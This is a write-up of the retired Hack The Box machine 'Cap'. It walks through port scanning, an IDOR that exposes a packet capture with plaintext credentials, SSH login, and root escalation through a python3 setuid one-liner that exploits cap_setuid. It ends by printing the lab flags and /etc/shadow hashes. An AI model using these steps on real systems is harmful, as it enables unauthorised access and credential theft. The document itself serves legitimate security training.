---
file_created: 24 Aug 2025 19:08
title: Cap
difficulty: Easy
difficult_sort: 1
points: 0
os: Linux
target_ip: 10.10.10.245
platform: Hack The Box
category: B2R
box_status: Retired
url: https://app.hackthebox.com/machines/Cap
user_flag: true
root_flag: true
completed: true
date_finish: 2025-08-25
tags:
  - htb/machines
---
# Resolution Summary
![400x200](<./attachments/Cap-8.png>)
>[!summary]
>- **Foothold** → IDOR in PCAP download → captured plaintext creds
>- **User** → SSH login with exposed creds
>- **Root** → Abused Linux capabilities (`cap_setuid`) for escalation
## Tutorial
```cardlink
url: https://www.youtube.com/watch?v=O_z6o2xuvlw
title: "HackTheBox - Cap"
description: "00:00 - Intro00:50 - Start of nmap and doing some recon against FTP02:40 - Having trouble finding a release date, using WGET and examining metadata to see ho..."
host: www.youtube.com
favicon: https://www.youtube.com/s/desktop/271635d3/img/logos/favicon_32x32.png
image: https://i.ytimg.com/vi/O_z6o2xuvlw/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AHUBoAC4AOKAgwIABABGEkgZSgXMA8=&rs=AOn4CLCQo4OitAMhTgYJbwSvO6Jzi1xz8g
```
- [Cap-HTB-Writeup](<./attachments/Cap.pdf>)
- [Medium](https://medium.com/@eng.jamaluddin/cap-machine-hack-the-box-25aac74883db)
## Improved Skills
- Practicing **IDOR exploitation**
- Leveraging **Linux capabilities** for privilege escalation
## Tools Used
- rustscan; nmap; gobuster; Wireshark
---
# Environment Setup
- After connected to openvpn
```bash
export HOST_IP=
export TARGET_IP=10.10.10.245
export DOMAIN=
{
  echo "HOST_IP=${HOST_IP:-}"
  echo "TARGET_IP=${TARGET_IP:-}"
  echo "DOMAIN=${DOMAIN:-}"
} > .env
source .env
```
---
# Information Gathering
## Scanned all ports
```bash
rustscan -a $ip -r 1-65535 -t 10000 --ulimit 5000 

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
## Enumerated open TCP ports
- use nmap 
```bash
nmap -sC -sV -oA recon/open-ports -p 21,22,80 $ip

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)

80/tcp open  http    gunicorn
|_http-title: Security Dashboard
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 07 Sep 2025 15:51:50 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 07 Sep 2025 15:51:41 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 07 Sep 2025 15:51:42 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=9/7%Time=68BDA9DD%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,3012,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Sun,\x2007\x20Sep\x202025\x2015:51:41\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:9386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\"
SF:>\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\
SF:x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x2
SF:0\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"ima
SF:ge/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\
SF:">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/f
SF:ont-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20re
SF:l=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min
SF:\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static
SF:/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpti
SF:ons,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sun,\
SF:x2007\x20Sep\x202025\x2015:51:42\x20GMT\r\nConnection:\x20close\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,
SF:\x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x
SF:20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inva
SF:lid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RT
SF:SP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,1
SF:89,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Sun,\x2007\x20Sep\x202025\x2015:51:50\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2023
SF:2\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x
SF:20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h
SF:1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20s
SF:erver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20
SF:check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumerated top 200 UDP ports:

```bash
nmap -sU --top-ports 200 -oN udp_scan.txt 10.10.10.245
```
## **Results**
- No significant UDP services identified.
- 21/tcp: FTP (vsftpd 3.0.3) - Anonymous login disabled
- 22/tcp: SSH (OpenSSH 8.2p1 Ubuntu)
- 80/tcp: HTTP ( gunicorn)
### **Key Findings**

- No immediate vulnerabilities identified on FTP or SSH.
---
# Enumeration
## Port 21 - FTP (vsftpd 3.0.3)
- 21/tcp: FTP (vsftpd 3.0.3) - Anonymous login disabled
- use  [Exploit database](https://www.exploit-db.com/exploits/49719)
![](<./attachments/Cap.png>)
- searchsploit command
![](<./attachments/Cap-1.png>)
### vulnerabilities
A Remote Denial of Service (RDDoS) attack is a malicious attempt to make a server, service, or network unavailable by sending a flood of traffic or specially crafted data from a remote location. - 
**DON'T USEFUL FOR RCE** if want to access
## Port 80 - HTTP (gunicorn)
- Port 80 hosts a web server with a dashboard application.
- **Web Server Details**: gunicorn running on Ubuntu.
- **Enumeration**: Used `gobuster` to enumerate directories:

```sh
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster.txt
```
- explore `10.10.10.245:80` in browser
- under security snapshots the `data/id` can be change
- change `data/2` to `data/0`
![](<./attachments/Cap-2.png>)

![](<./attachments/Cap-3.png>)
- download the `o.pcap` and analyze with `wireshark/tcpdump`
### **Findings**:
- Discovered `/data/` directory, which allowed access to files via an insecure direct object reference (IDOR) vulnerability.
- URL: `http://10.10.10.245/data/0` displayed a network packet capture (PCAP) file.
- Iterated through IDs (e.g., `/data/1`, `/data/2`) and found sensitive files, including user credentials in a downloadable file.
# Exploitation
## File Download Vulnerability

- The web application allowed unauthenticated access to sensitive files via the `/data/` endpoint.
- Used the extracted credentials (`nathan:Buck3tH4TF0RM3!`) to attempt login via SSH on port 22.
### **Credentials Discovery**:
  - Downloaded a file from `/data/0` using `curl`:
```bash
curl http://10.10.10.245/data/0 -o data_0.pcap
```
  
  - Analyzed the PCAP file using **Wireshark** or **tcpdump** and extracted credentials:

#### wireshark Method
```sh title:wireshark
wireshark 0.pcap
```

- filter via protocol, right-click select `follow/tcp stream`
![](<./attachments/Cap-5.png>)
>nathan:Buck3tH4TF0RM3!

- can be used to ssh into user `nathan`
```bash
sshpass -p Buck3tH4TF0RM3! ssh nathan@10.10.10.245 -p 22
```

#### tcpdump Method
```sh title:tcpdump
sudo tcpdump -r 0.pcap -A | grep -Ei "USER|PASS"
```
![](<./attachments/Cap-4.png>)
---
# Privilege Escalation to Root

## Local Enumeration

- Checked user privileges and system configuration:

```bash
whoami
id
sudo -l
```

- **Output**:
  - User: `nathan`
  - No `sudo` privileges.
  - Checked for unusual capabilities:

```bash
getcap -r / 2>/dev/null
```
- or use linpeas 
![](<./attachments/Cap-6.png>)
### **Key Finding**:
  - Discovered that `/usr/bin/python3` had the `cap_setuid+ep` capability, allowing it to set the user ID to any user (including root).

## Privilege Escalation Vector

- Exploited the Python capability to execute a script that sets the effective user ID to 0 (root):

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- This spawned a root shell, granting full administrative access.
---
# Flags
## User Flag
```txt
eb5664f19ed353f783de12dc9e75647a
```
## Root Flag
```txt
219c22cf58856a0e9e27cc298f3b83d2
```
## /etc/shadow
```txt
root:$6$8vQCitG5q4/cAsI0$Ey/2luHcqUjzLfwBWtArUls9.IlVMjqudyWNOUFUGDgbs9T0RqxH6PYGu/ya6yG0MNfeklSnBLlOskd98Mqdm0
:18762:0:99999:7:::
nathan:$6$R9uks4CNctqqxTOR$/PRd4MKFG5NUNxPkdvIedn.WGvkBh9zqcvCRRzgggky1Xcv7ZxTXfny0QmA.gZ/8keiXdblFB7muSeo2igvj
k.:18762:0:99999:7:::
```
---
# Proof
![](<./attachments/Cap-7.png>)
